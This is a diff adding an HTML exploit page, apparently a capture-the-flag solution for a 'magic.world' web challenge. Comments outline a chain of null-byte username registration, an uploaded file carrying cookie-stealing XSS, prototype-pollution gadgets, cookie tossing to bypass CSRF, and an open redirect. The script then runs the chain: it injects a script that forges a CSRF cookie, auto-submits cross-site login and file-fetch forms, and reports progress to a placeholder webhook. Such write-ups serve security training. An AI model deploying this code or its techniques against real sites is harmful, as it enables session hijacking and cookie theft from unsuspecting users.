@@ -1,0 +1,67 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Document</title>
+</head>
+
+<body>
+    <form id="login" method="post" target="_blank">
+        <input type="text" name="username" id="username">
+        <input type="text" name="password" id="password">
+        <input type="text" name="_csrf" value="nyxmare">
+        <input type="submit" value="Submit">
+    </form>
+
+    <form id="get_file" method="post" target="_blank">
+        <input type="text" name="_csrf" value="nyxmare">
+        <input type="submit" value="Submit">
+    </form>
+    <script>
+        // 1. Register a user with a username contains a null byte, ex: AAAAAAAAA\u0000
+        // 2. Upload non-malicious file (a text/plain file for example) with the contents of XSS that steal cookie
+        // 3. Copy the uuid and replace it in `get_file.action`
+        // 4. There's a prototype pollution with the gadget in el.attr({}) to achieve XSS in frontend.*, you can make use of this vulnerability to achieve cookie tossing and bypassing the CSRF
+        // 5. In the backend.*, there's a prototype pollution with the gadget can lead to open redirect, by using fetch gadget to make an invalid request where the response will be invalid csrf without `path` key
+
+        // Send this to the bot!
+        // http://backend.magic.world:1337/?__proto%5f_.method=POST&__proto%5f_.path=//your_domain/index.html
+
+
+        let webhook = "https://your_webhook/"
+        fetch(`${webhook}?step=0`)
+        
+        const sleep = ms => new Promise(r => setTimeout(r, ms));
+        (async () => {
+            let root_domain = ".magic.world"
+            let URL_1 = "http://frontend.magic.world:1337/"
+            let URL_2 = "http://backend.magic.world:1337"
+            
+            
+            fetch(`${webhook}/?step=1`)
+            window.open(`${URL_1}/?__proto%5f_.srcdoc[]=<script\u003edocument.cookie='_csrf=nyxmare; Path=/login; Domain=${root_domain}'\u003c/script\u003e`)
+            
+            await sleep(5000)
+            fetch(`${webhook}/?step=2`)
+            login.action = `${URL_2}/login`
+            username.value = "your_username\x00"
+            password.value = "your_password"
+            login.submit()
+            
+            await sleep(2000)
+            fetch(`${webhook}/?step=3`)
+
+            // replace this into your uuid file and change the extension into .html (this happen because there's no check to the filename)
+            get_file.action = `${URL_2}/file/01333e3f-b860-423b-abcd-73dace20e89e/a.html`
+            get_file.submit()
+        })()
+    </script>
+
+
+
+</body>
+
+</html>
